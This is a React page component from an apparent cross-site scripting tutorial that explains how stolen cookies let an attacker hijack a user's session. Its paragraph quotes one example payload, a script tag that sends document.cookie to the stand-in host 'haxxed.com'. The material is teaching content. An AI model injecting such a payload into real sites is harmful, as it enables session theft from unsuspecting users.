import React, { Component } from 'react';
import Navbar from '../components/Navbar.jsx';
import Jumbotron from '../components/Jumbotron.jsx';
import { Link } from 'react-router-dom';

class Example4 extends Component {
  render() {
    return (
      <div>
      	<Navbar />
      	<Jumbotron title="Simulation" subtitle="Credit: hacksplaining.com"/>
        <div className="container" id="simulation">
          <Link to="/example5" id="link">Next</Link>
          <img className="center" src={ require('../images/example4.png') } />
          <p>
            From using this method, a real attack can occur, where a user’s cookies could be taken without knowing. When this happens, this allows the hacker to have a period of time to hijack a session and pretend to be the user. The hacker would use something along the lines of this line of JavaScript code: <code> {"<script>window.location = 'haxxed.com?cookie=' + document.cookie</script>"}</code>
		      </p>

        </div>
      </div>
    );
  }
}

export default Example4;
